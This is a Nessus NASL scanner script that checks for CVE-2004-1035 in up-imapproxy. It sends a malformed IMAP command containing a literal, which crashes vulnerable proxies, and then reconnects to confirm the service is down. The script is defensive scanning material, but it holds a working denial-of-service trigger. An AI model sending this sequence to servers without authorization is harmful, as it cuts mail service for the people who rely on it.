#
# This script was written by George A. Theall, <theall@tifaware.com>.
#
# See the Nessus Scripts License for details.
#

if (description) {
  script_id(15853);
  script_version("$Revision: 1.2 $");

  script_cve_id("CVE-2004-1035");
  script_bugtraq_id(11630);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"11584");
  }

  name["english"] = "up-imapproxy Literal DoS Vulnerability";
  script_name(english:name["english"]);
 
  desc["english"] = "
The remote host is running at least one instance of up-imapproxy that does
not properly handle IMAP literals.  This flaw allows a remote attacker
to crash the proxy, killing existing connections as well as preventing
new ones, by using literals at unexpected times.

Solution : Upgrade to up-imapproxy 1.2.3rc2 or later.
Risk factor : Low";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for Literal DoS Vulnerability in up-imapproxy";
  script_summary(english:summary["english"]);
 
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2004 George A. Theall");

  family["english"] = "Denial of Service";
  script_family(english:family["english"]);

  script_dependencie("find_service.nes", "global_settings.nasl");
  script_require_ports("Services/imap", 143);
  script_exclude_keys("imap/false_imap");

  exit(0);
}

include("global_settings.inc");

port = get_kb_item("Services/imap");
if (!port) port = 143;
debug_print("checking for Literal DoS Vulnerability in up-imapproxy on port ", port, ".");
if (!get_port_state(port)) exit(0);
# nb: skip it if traffic is encrypted since uw-imapproxy only
#     supports TLS when acting as a client.
encaps = get_port_transport(encaps);
if (encaps > 1) exit(0);


# Establish a connection.
tag = 0;
soc = open_sock_tcp(port);
if (!soc) exit(0);

# Read banner.
s = recv_line(socket:soc, length:1024);
if (!strlen(s)) {
  close(soc);
  exit(0);
}
s = chomp(s);
debug_print("S: '", s, "'.");

# Try to crash the service by sending an invalid command with a literal.
++tag;
c = string("a", string(tag), " nessus is testing {1}");
debug_print("C: '", c, "'.");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  debug_print("S: '", s, "'.");
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp='';
}
if (resp && resp =~ "BAD") {
  c = "up-imapproxy";
  debug_print("C: '", c, "'.");
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    debug_print("S: '", s, "'.");
    # nb: the pattern changes since an unproxied service will echo a line
    #     like "up-imapproxy BAD Missing command".
    m = eregmatch(pattern:"^[^ ]+ (OK|BAD|NO)", string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp='';
  }
  # If we didn't get a response, make sure the service is truly down.
  if (!resp) {
    debug_print("no response received.");
    close(soc);
    soc = open_sock_tcp(port);
    if (!soc) {
      debug_print("imap service is down.");
      security_warning(port);
      exit(0);
    }
    else {
      debug_print("imap service is up -- huh?");
    }
  }
}

# Logout.
++tag;
c = string("a", string(tag), " LOGOUT");
debug_print("C: '", c, "'.");
send(socket:soc, data:string(c, "\r\n"));
while (s = recv_line(socket:soc, length:1024)) {
  s = chomp(s);
  debug_print("S: '", s, "'.");
  m = eregmatch(pattern:string("^a", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
  if (!isnull(m)) {
    resp = m[1];
    break;
  }
  resp = "";
}
close(soc);
